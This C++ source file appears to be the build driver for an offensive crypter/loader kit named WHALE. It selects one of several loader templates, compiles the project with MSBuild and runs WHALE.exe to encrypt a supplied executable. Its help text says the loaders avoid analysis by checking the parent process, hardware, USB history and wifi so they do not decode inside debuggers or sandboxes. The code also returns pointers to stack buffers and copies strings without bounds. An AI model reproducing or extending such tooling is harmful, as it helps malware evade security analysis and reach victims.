#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <tchar.h>

char* allocateDistenation();



//delete a file name allocated here C:\Users\...\WHALE\HuanLoader\[LoaderName].cpp
void Delete(char* LoaderName) {
	char Delete[200];
	printf("[+] Deleting last loader Files [%s] ... ", LoaderName);
	strcpy(Delete, SOLUTIONDIR);
	strcat(Delete, "\\HuanLoader\\");
	strcat(Delete, LoaderName);
	remove(Delete);
	printf(" [ + ] DONE \n");
}



void copy(char* distenation, char* source, char* LoaderName) {

	//deleting all files if they really exist before allocating what we need to build
	Delete((char*)"EvadeAllLoader.cpp");
	Delete((char*)"EvadeDebuggerLoader.cpp");
	Delete((char*)"EvadeSandBoxLoader.cpp");
	Delete((char*)"HuanLoader.cpp");

	//making the copy as so : 
	//source : C:\Users\...\WHALE\loaders\[source].cpp
	//distenation : C:\Users\...\WHALE\HuanLoader\ [here]
	char command[250];
	strcpy(command, "copy ");
	strcat(command, source);
	strcat(command, " ");
	strcat(command, distenation);
	system(command);
	//since we moved a the file from C:\Users\...\WHALE\loaders\[source].cpp we need to rename that [source].cpp to "HuanLoader.cpp" so that it can build .
	printf("[+] Renaming files so that we can build ... ");
	char directory[200];
	char NewName[20] = "HuanLoader.cpp";
	strcpy(directory, allocateDistenation());
	strcat(directory, NewName);
	// "directory" variable is now: C:\Users\...\WHALE\HuanLoader\HuanLoader.cpp
	char oldName[100];
	strcpy(oldName, distenation);
	strcat(oldName, LoaderName);
	//"oldName" variable is now: C:\Users\...\WHALE\HuanLoader\"LoaderName".cpp
	int  result = rename(oldName, directory);
	if (result != 0)
		printf("[!] Could not rename '%s'\n", directory);
	else
		printf(" [ + ] DONE \n");
		//deleting the old name variable, so that only HuanLoader.cpp is in the HuanLoader dir
		Delete(oldName);
}



char* allocateSource(char* LoaderName) {
	//this function get the loader name full path 
	char directory[200];
	strcpy(directory, SOLUTIONDIR);
	strcat(directory, "\\loaders\\");
	strcat(directory, LoaderName);
	return directory;
}

char* allocateDistenation() { 
	//LoaderName will be passed here just so that we can remove it from the directory if found
	//it will return the full path of C:\Users\...\WHALE\HuanLoader\ [here]
	char directory[200];
	strcpy(directory, SOLUTIONDIR);
	strcat(directory, "\\HuanLoader\\");
	return directory;
}

void RunWhale(char* whalepath, char* exetoencrypt) {
	printf("[+] Running whale.exe to encrypt ...");
	char command[250];
	strcpy(command, whalepath);
	strcat(command, " ");
	strcat(command, exetoencrypt);
	system(command);
	printf("[ + ] DONE \n");
}


int main(int argc, char* argv[]) {
	

	if (argc != 3) {
		printf("[+] Usage: %s  <number of loader> <name of file to encrypt>\n", argv[0]);
		printf("[+] Number Can Be: \n \n\t [0] : Loader's Functionalities  \n\t [1] : EvadeAllLoader \n\t [2] : EvadeDebuggerLoader \n\t [3] : EvadeSandBoxLoader \n\t [4] : PureLoader \n\n");
		system("PAUSE");
		return -1;
	}

	if (atoi(argv[1]) > 4 || atoi(argv[1]) < 0) {
		printf("[!] Wrong Number ! \n");
		printf("[+] Number Can Be: \n \n\t [0] : Loader's Functionalities  \n\t [1] : EvadeAllLoader \n\t [2] : EvadeDebuggerLoader \n\t [3] : EvadeSandBoxLoader \n\t [4] : PureLoader \n");
		system("PAUSE");
		return -1;
	}

	if (atoi(argv[1]) == 0) {
		printf("\n[1] : EvadeAllLoader : Contains all the functions of other loaders listed below \n\n");
		printf("[2] : EvadeDebuggerLoader : Checks if the ppid isnt \"explorer.exe\" as in normal situations, if not it will not decode and exit \n\n");
		printf("[3] : EvadeSandBoxLoader : Checks for hardware, history of usb mounted before, and the wifi connection of the target, if one of \n\t\t\t   these situations are satisfied, it will not decode and exit\n\n");
		printf("[4] : PureLoader : Do not add any checking for env method, it will decode and run directly \n\n");
		system("PAUSE");
		return -1;
	}

	char LoaderName[100];

	switch (atoi(argv[1]))
	{
	case 1:
		strcpy(LoaderName,"EvadeAllLoader.cpp");
		break;
	case 2:
		strcpy(LoaderName, "EvadeDebuggerLoader.cpp");
		break;
	case 3:
		strcpy(LoaderName, "EvadeSandBoxLoader.cpp");
		break;
	case 4: 
		strcpy(LoaderName, "HuanLoader.cpp");
		break;
	default:
		printf("[!] No Loader Name Like So\n");
		break;
	}

	printf("[+] Loader is chosed to be : %s \n", LoaderName);
	//getting the loader name based on switch statement
	char Source[250];
	strcpy(Source,allocateSource(LoaderName));

	//getting the path of HuanLoader project
	char Distenation[250];
	strcpy(Distenation,allocateDistenation());

	//copying what the user want to HuanLoader project
	copy(Distenation, Source, LoaderName);

	//getting the compiler path
	const char* vsWhere = "\"\"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath\"";
	FILE* pipe = _popen(vsWhere, "rt");
	if (pipe != NULL) {
		char compilerPath[MAX_PATH] = { 0 };
		char fullCommand[MAX_PATH] = { 0 };
		if (fgets(compilerPath, MAX_PATH, pipe) != NULL) {
			//Remove new line
			compilerPath[strlen(compilerPath) - 1] = '\0';
			//compiling WHALE using vs command line:
			sprintf(fullCommand, "\"\"%s\\MSBuild\\Current\\Bin\\MSBuild.exe\" %s\\WHALE.sln /t:WHALE /property:Configuration=Release /property:RuntimeLibrary=MT\"\n", compilerPath, SOLUTIONDIR);
			FILE* pipe2 = _popen(fullCommand, "rt");
			_pclose(pipe2);
			char* loaderBinaryPath = (char*)malloc(MAX_PATH);
			//C:\Users\area51m\Desktop\WHALE\x64\Release\WHALE.exe
			sprintf(loaderBinaryPath, "%sx64\\Release\\WHALE.exe", SOLUTIONDIR);
			if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(loaderBinaryPath) && GetLastError() == ERROR_FILE_NOT_FOUND) {
				std::cout << "[!] Compiled binary not found!" << std::endl;
				free(loaderBinaryPath);
				return NULL;
			}
			else {
				printf("[+] WHALE.exe is Built at %s \n", loaderBinaryPath);
				RunWhale(loaderBinaryPath, argv[2]);
			}
		}
	}
	else {
		std::cout << "[!] Visual Studio compiler path is not found! " << std::endl;
		return NULL;
	}
	_pclose(pipe);

	
}

